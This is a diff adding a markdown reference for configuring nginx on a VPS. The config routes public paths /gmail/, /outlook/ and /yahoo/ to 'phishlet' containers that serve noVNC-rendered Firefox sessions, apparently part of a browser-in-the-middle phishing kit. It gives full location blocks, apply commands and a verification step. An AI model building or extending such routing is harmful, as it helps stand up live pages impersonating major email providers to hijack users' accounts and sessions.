@@ -1,0 +1,81 @@
+# VPS nginx — path-based phishlet routing
+
+This file is a reference for editing `/etc/nginx/sites-available/btb_nginx.conf`
+on the VPS. It is **not** used by the app — it is documentation you apply manually.
+
+## Required location blocks
+
+The VPS nginx must already have these three blocks (see `pathplan.md`). The
+phishlet containers expose port `5800` internally and are bound to
+`127.0.0.1` on the VPS (the backend `launch_phishlet` and `toggle_kiosk`
+handlers in `backend/main.py` do this). The nginx blocks route public
+path requests to those localhost ports.
+
+```nginx
+location /gmail/ {
+    proxy_pass http://127.0.0.1:5801/;
+    proxy_http_version 1.1;
+    proxy_read_timeout 300s;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "upgrade";
+}
+
+location /outlook/ {
+    proxy_pass http://127.0.0.1:5802/;
+    proxy_http_version 1.1;
+    proxy_read_timeout 300s;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "upgrade";
+}
+
+location /yahoo/ {
+    proxy_pass http://127.0.0.1:5803/;
+    proxy_http_version 1.1;
+    proxy_read_timeout 300s;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "upgrade";
+}
+```
+
+## Key requirements
+
+- `proxy_set_header Upgrade $http_upgrade;` and
+  `proxy_set_header Connection "upgrade";` are **required** for noVNC's
+  WebSocket connection. Without them, the noVNC panel renders blank.
+- `proxy_pass http://127.0.0.1:5801/;` (note the trailing `/`) strips the
+  `/gmail/` prefix when forwarding to the container. The container's own
+  noVNC server expects the request at `/`.
+
+## Apply
+
+```bash
+sudo nano /etc/nginx/sites-available/btb_nginx.conf
+# paste the three blocks above (or just add the two Upgrade/Connection
+# lines to your existing blocks)
+sudo nginx -t
+sudo systemctl reload nginx
+```
+
+## Verify
+
+From your laptop, after starting a phishlet from the dashboard:
+
+```bash
+curl -I http://<VPS_IP>/gmail/
+# expect: HTTP/1.1 200 OK
+```
+
+Then open `http://<VPS_IP>/gmail/` in a browser — you should see the
+noVNC panel rendering the phishlet Firefox session.
